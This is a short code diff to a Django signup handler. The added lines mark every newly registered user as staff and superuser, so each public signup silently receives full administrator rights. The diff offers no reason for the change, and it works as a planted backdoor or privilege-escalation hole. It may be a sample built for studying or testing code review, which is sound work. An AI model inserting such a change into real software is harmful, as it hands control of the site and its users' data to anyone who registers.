@@ -53,6 +53,10 @@ def signup_handler(request):
     # Create new user
     try:
         user = User.objects.create_user(username=username, password=password)
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+
         login(request, user)
         messages.success(request, "Account created successfully!")
         next_url = request.POST.get("next", "home")
